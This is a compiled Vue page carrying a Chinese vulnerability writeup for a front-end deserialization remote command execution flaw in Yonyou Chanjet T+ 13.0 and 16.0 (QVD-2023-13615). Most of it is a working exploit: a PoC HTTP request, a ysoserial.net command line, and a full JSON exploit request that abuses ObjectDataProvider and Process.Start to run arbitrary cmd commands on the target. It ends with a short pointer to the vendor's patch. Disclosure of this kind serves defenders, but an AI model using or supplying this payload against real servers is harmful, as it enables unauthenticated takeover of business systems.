import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as s,c as r,a as e,b as t,d,e as o}from"./app-58e4a7d6.js";const l={},u=o(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>由于用友畅捷通 T+前台存在反序列化漏洞，恶意攻击者成功利用此漏洞可在目标服务器上执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>T+13.0
T+16.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  &quot;storeID&quot;:{}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用ysoserial.net工具构造payload</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>./ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c &quot;执行的命令&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>exp</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: your-ip
X-Ajaxpro-Method: GetStoreWarehouseByStore
 
{
  &quot;storeID&quot;:{
    &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,
    &quot;MethodName&quot;:&quot;Start&quot;,
    &quot;ObjectInstance&quot;:{
        &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,
        &quot;StartInfo&quot;: {
            &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,
            &quot;FileName&quot;:&quot;cmd&quot;, &quot;Arguments&quot;:&quot;/c 执行的命令&quot;
        }
    }
  }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,12),c={href:"https://www.chanjetvip.com/product/goods/",target:"_blank",rel:"noopener noreferrer"};function v(m,h){const n=i("ExternalLinkIcon");return s(),r("div",null,[u,e("p",null,[t("目前官方已修复该漏洞，受影响用户可以升级更新到安全版本。官方下载链接："),e("a",c,[t("https://www.chanjetvip.com/product/goods/"),d(n)])])])}const _=a(l,[["render",v],["__file","用友 畅捷通 T_ 前台远程命令执行漏洞 QVD-2023-13615.html.vue"]]);export{_ as default};
